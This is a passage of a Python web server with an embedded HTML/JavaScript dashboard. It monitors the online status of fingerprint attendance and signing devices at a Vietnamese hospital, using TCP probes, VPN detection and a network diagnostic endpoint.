           oninput="applyFilter()" autocomplete="off">
  </span>
  <span class="filter-chip active" data-filter="all" onclick="setFilter(this, 'all')">Tất cả</span>
  <span class="filter-chip" data-filter="online" onclick="setFilter(this, 'online')">Online</span>
  <span class="filter-chip" data-filter="offline" onclick="setFilter(this, 'offline')">Offline</span>
  <span class="filter-chip" data-filter="cc" onclick="setFilter(this, 'cc')">CC</span>
  <span class="filter-chip" data-filter="signing" onclick="setFilter(this, 'signing')">KY</span>
  <span class="filter-chip" data-filter="virtual" onclick="setFilter(this, 'virtual')">SIM</span>
</div>
<div class="stats" id="stats"></div>
<table>
<thead><tr>
  <th>#</th><th>IP</th><th>Tên thiết bị</th><th>Loại</th><th>Trạng thái</th>
  <th>Latency</th><th>Log count</th><th>Probe lúc</th><th>Lỗi</th>
</tr></thead>
<tbody id="rows"></tbody>
</table>
<script>
let lastData = null;
let currentFilter = 'all';
async function probe() {
  document.getElementById('info').textContent = 'Đang probe...';
  try {
    const r = await fetch('/api/live');
    const data = await r.json();
    lastData = data;
    render(data);
  } catch (e) {
    document.getElementById('info').textContent = 'Lỗi: ' + (e && e.message ? e.message : (typeof e === 'string' ? e : 'fetch failed'));
  }
}
function setFilter(el, f) {
  currentFilter = f;
  document.querySelectorAll('.filter-chip').forEach(c => c.classList.remove('active'));
  if (el) el.classList.add('active');
  if (lastData) render(lastData);
}
function applyFilter() {
  if (lastData) render(lastData);
}
function render(data) {
  const stats = document.getElementById('stats');
  stats.innerHTML =
    '<div class="stat"><div class="v">' + data.checked + '</div><div class="l">Tổng thiết bị</div></div>' +
    '<div class="stat ok"><div class="v">' + data.online + '</div><div class="l">Online</div></div>' +
    '<div class="stat fail"><div class="v">' + data.offline + '</div><div class="l">Offline</div></div>' +
    '<div class="stat"><div class="v">' + data.probed_at.split(' ')[1] + '</div><div class="l">Probe lúc</div></div>';
  const search = (document.getElementById('searchBox') ? document.getElementById('searchBox').value : '').toLowerCase().trim();
  const tbody = document.getElementById('rows');
  let filtered = data.devices.filter(function(d) {
    const ip = (d.ip || '').toLowerCase();
    const isVirt = ip.indexOf('virtual') >= 0;
    const isOnline = isVirt ? true : !!d.ping_ok;
    if (currentFilter === 'online' && !isOnline) return false;
    if (currentFilter === 'offline' && isOnline) return false;
    if (currentFilter === 'cc' && d.type !== 'attendance') return false;
    if (currentFilter === 'signing' && d.type !== 'signing') return false;
    if (currentFilter === 'virtual' && !isVirt) return false;
    if (search) {
      if (ip.indexOf(search) < 0 &&
          ((d.name || '').toLowerCase().indexOf(search) < 0) &&
          ((d.ping_err || '').toLowerCase().indexOf(search) < 0) &&
          ((d.type || '').toLowerCase().indexOf(search) < 0)) return false;
    }
    return true;
  });
  let i = 1;
  tbody.innerHTML = filtered.map(function(d) {
    const ip = d.ip || '';
    const isVirtual = ip.indexOf('virtual') >= 0;
    const okClass = isVirtual ? 'pill-virt' : (d.type === 'signing' ? 'pill-sig' : 'pill-att');
    const typeName = isVirtual ? 'Virtual' : (d.type === 'signing' ? 'Ký' : 'CC');
    const statusPill = isVirtual
      ? '<span class="pill pill-virt">SIM</span>'
      : (d.ping_ok
          ? '<span class="pill pill-on">● Online ' + d.ping_ms + 'ms</span>'
          : '<span class="pill pill-off">○ Offline</span>');
    const errCell = isVirtual ? '' : (d.ping_err ? '<span class="err">' + d.ping_err + '</span>' : '');
    return '<tr>' +
      '<td>' + (i++) + '</td>' +
      '<td>' + ip + '</td>' +
      '<td>' + (d.name || '') + '</td>' +
      '<td><span class="pill ' + okClass + '">' + typeName + '</span></td>' +
      '<td>' + statusPill + '</td>' +
      '<td>' + (d.ping_ms || 0) + ' ms</td>' +
      '<td>' + (d.log_count || 0) + '</td>' +
      '<td>' + (d.ping_at || '') + '</td>' +
      '<td>' + errCell + '</td>' +
      '</tr>';
  }).join('');
  const totalCount = data.devices.length;
  const filterInfo = filtered.length !== totalCount ? ' (' + filtered.length + '/' + totalCount + ')' : '';
  document.getElementById('info').textContent = 'Cập nhật lúc ' + data.probed_at + filterInfo + ' - tự refresh sau 8s';
}
probe();
setInterval(probe, 8000);
</script>
</body>
</html>'''
        body = page.encode('utf-8')
        self.send_response(200)
        self.send_header('Content-Type', 'text/html; charset=utf-8')
        self.send_header('Content-Length', str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def _handle_tools_page(self):
        tools_path = os.path.join(os.path.dirname(__file__), 'tools.html')
        if os.path.exists(tools_path):
            with open(tools_path, 'rb') as f:
                content = f.read()
            self.send_response(200)
            self.send_header('Content-Type', 'text/html; charset=utf-8')
            self.end_headers()
            self.wfile.write(content)
        else:
            self.send_response(404)
            self.end_headers()

    def _handle_ping_all(self):
        """Ping all attendance devices in parallel - returns online status.
        Uses socket-level TCP connect with retry + backoff for flaky devices (e.g. May 20 = 172.16.8.139).

        Auto-detects VPN mode (when connecting from outside BV via Sophos Connect):
          - Detects via UDP connect probe to first device IP - reads local IP
          - If local IP is NOT in 172.16.x (so going through VPN tunnel), use longer timeout
          - VPN latency can be 50-200ms+ per hop, need 5s timeout and 4 retries
          - Parallel workers limited to 6 to avoid overwhelming VPN gateway
        """
        import concurrent.futures, socket

        # Detect VPN mode: try to determine local IP via dummy UDP connect
        is_vpn = False
        try:
            s_probe = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s_probe.settimeout(0.5)
            s_probe.connect(('172.16.0.214', 80))  # any 172.16 IP
            local_ip = s_probe.getsockname()[0]
            s_probe.close()
            is_vpn = not local_ip.startswith('172.16.')
        except Exception:
            is_vpn = False

        if is_vpn:
            effective_timeout = 3.0
            effective_retries = 2
            max_workers = 8
            mode_label = 'VPN'
        else:
            effective_timeout = 2.0
            effective_retries = 3
            max_workers = min(10, len(devices_state))
            mode_label = 'LAN'

        def check(d):
            ip = d['ip']
            # Multiple retries with exponential backoff - fixes race on rapid reconnect
            for attempt in range(effective_retries):
                try:
                    import time
                    t0 = time.time()
                    s = socket.create_connection((ip, 4370), timeout=effective_timeout)
                    s.close()
                    lat = int((time.time() - t0) * 1000)
                    return {**d, 'online': True, 'latency_ms': lat}
                except Exception as e:
                    if attempt < effective_retries - 1:
                        time.sleep(0.3 * (attempt + 1))  # 0.3s, 0.6s, 0.9s backoff
                        continue
                    err_short = str(e)[:80]
                    # Mark WinError 1005 as "session-busy" (race condition, not really offline)
                    if '1005' in err_short or 'session' in err_short.lower():
                        err_short = 'session-busy (retry later)'
                    # VPN-specific: mark as "VPN-route-lost" if timeout
                    if is_vpn and ('timed out' in err_short.lower() or 'timeout' in err_short.lower()):
                        err_short = 'VPN route timeout (Sophos dropped?)'
                    return {**d, 'online': False, 'latency_ms': -1, 'err': err_short}
        att_devices = [d for d in devices_state if d.get('type') == 'attendance' and d['ip'] != 'virtual.x628pro']
        with concurrent.futures.ThreadPoolExecutor(max_workers=max(1, min(max_workers, len(att_devices)))) as ex:
            results = list(ex.map(check, att_devices))
        self.send_json({'ok': True, 'mode': mode_label, 'devices': results, 'count': len(results),
                        'online_count': sum(1 for r in results if r.get('online'))})

    def _handle_diag(self):
        """
        Network diagnostic endpoint - returns the IPs the server is reachable on,
        so the phone can verify which address to use. Also returns the local
        network interface IPs and a quick reachability test.
        """
        import socket
        result = {
            'ok': True,
            'server': 'attendance_web.py',
            'version': '2.0.6',
            'pid': os.getpid(),
            'now': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'port': 8080,
            'host': socket.gethostname(),
            'fqdn': socket.getfqdn(),
            'reachable_urls': [],
            'interfaces': [],
        }
        # Collect all local IPs
        try:
            addrs = socket.getaddrinfo(socket.gethostname(), None)
            seen = set()
            for fam, _t, _p, _c, sa in addrs:
                if fam == socket.AF_INET:
                    ip = sa[0]
                    if ip not in seen and not ip.startswith('127.'):
                        seen.add(ip)
                        result['interfaces'].append(ip)
                        result['reachable_urls'].append('http://' + ip + ':8080')
        except Exception as e:
            result['interfaces_error'] = str(e)
        # Primary IP via UDP socket trick (works without DNS)
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(0.5)
            s.connect(('8.8.8.8', 80))
            primary_ip = s.getsockname()[0]
            s.close()
            result['primary_ip'] = primary_ip
            if primary_ip not in result['interfaces']:
                result['interfaces'].insert(0, primary_ip)
                result['reachable_urls'].insert(0, 'http://' + primary_ip + ':8080')
        except Exception as e:
            result['primary_ip_error'] = str(e)
        # Also expose 127.0.0.1 for local testing
        result['reachable_urls'].append('http://127.0.0.1:8080')
        # Number of devices in the system
        result['device_count'] = len(devices_state)
        result['record_count'] = len(all_records)
        self.send_json(result)


def main():
    print('=' * 60)
    print('ATTENDANCE LOG VIEWER - BVDK NINH THUAN')
    print('=' * 60)
    print('Phan biet may cham cong van tay (CC) va may ky van tay (KY)')
    print('Loading devices from: ' + DEVICES_FILE)
    load_devices()
    n_att = sum(1 for d in devices_state if d['type'] == 'attendance')
    n_sig = sum(1 for d in devices_state if d['type'] == 'signing')
    n_other = len(devices_state) - n_att - n_sig
    print('Loaded: {0} cham cong, {1} ky van tay, {2} khac'.format(n_att, n_sig, n_other))
    print()
    print('Server dang khoi dong tai: http://localhost:8080')
    print('Mo browser (Chrome/Edge/Firefox) va truy cap:')
    print('    http://localhost:8080')
    print()
    print('Tinh nang:')
    print('  - Phan biet may cham cong (CC) va may ky van tay (KY)')
    print('  - Dung dropdown tren moi may de doi loai')
    print('  - Nut "Dung" de dung fetch giua chung')
    print('  - Filter theo loai thiet bi (checkbox)')
    print()
    print('Nhan Ctrl+C de thoat.')
    print()

    port = 8080
    server = HTTPServer(('0.0.0.0', port), Handler)
    print('[OK] Server ready on port {0}'.format(port))
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print('\n[*] Stopping...')
        server.shutdown()


if __name__ == '__main__':
    main()
